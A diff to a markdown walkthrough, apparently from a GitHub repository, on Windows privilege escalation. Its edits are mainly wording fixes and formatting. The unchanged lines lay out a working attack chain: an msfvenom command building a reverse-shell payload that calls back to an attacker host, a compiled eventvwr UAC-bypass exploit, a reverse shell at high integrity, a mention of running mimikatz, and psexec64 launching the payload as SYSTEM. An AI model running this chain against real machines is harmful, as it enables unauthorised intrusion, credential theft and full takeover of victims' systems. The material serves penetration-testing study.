@@ -43,16 +43,16 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -f exe > s
 ```
 we gonna use [eventvwr-bypassuac.c](https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c)
 
-NOTE: Remember the name of the reverse shell that we generated with masfvenom is shell.exe. If you have given another name to payload must change the name in C script and both our shell.exe and eventvwr-bypassuac.c are on same directory on attacker vm.
+
+NOTE: Remember the name of the reverse shell that we generated with masfvenom is shell.exe. If you have given another name to payload, must change the name in C script and both our shell.exe and eventvwr-bypassuac.c needs to be on same directory on attacker vm.
 
 We need to compile the C script to get our exploit.
 ```markdown
 x86_64-w64-mingw32-gcc eventvwr-bypassuac.c -o eventvwr-bypassuac-64.exe
 ```
 
-![OnPaste 20220608-172531](https://user-images.githubusercontent.com/106917304/172610419-1a2bd97d-0062-401e-92a7-12ac91721850.png)
-
 ![OnPaste 20220608-172613](https://user-images.githubusercontent.com/106917304/172610444-fbd93a1f-09bf-4a31-b099-0d9f371391b3.png)
+
 
 ## Reverse Shell
 
@@ -63,9 +63,11 @@ Now upload shell.exe and eventvwr-bypassuac-64.exe to target machine and execute
 ![OnPaste 20220608-173002](https://user-images.githubusercontent.com/106917304/172611083-5c94570f-2d4b-4eef-a7a8-5ea6308fd890.png)
 
 Got Reverse Shell.
+
 ![OnPaste 20220608-173131](https://user-images.githubusercontent.com/106917304/172611380-ad7daa97-e036-4d7a-9717-3c8740496d66.png)
 
 We can see that now we are on High Mandatory Level.
+
 ![OnPaste 20220608-173341](https://user-images.githubusercontent.com/106917304/172611822-9f2d5991-d494-40a2-9815-ef76f572cfa4.png)
 
 Now we can run mimikatz!
@@ -77,5 +79,5 @@ Upload psexec64.exe and shell.exe on target machine with High Mandatory Level. N
 .\psexec64.exe -i -accepteula -d -s C:\\programdata\\shell.exe
 ```
 
-After that we'll a reverse shell as SYSTEM.
+After that we'll get a reverse shell as SYSTEM.
 
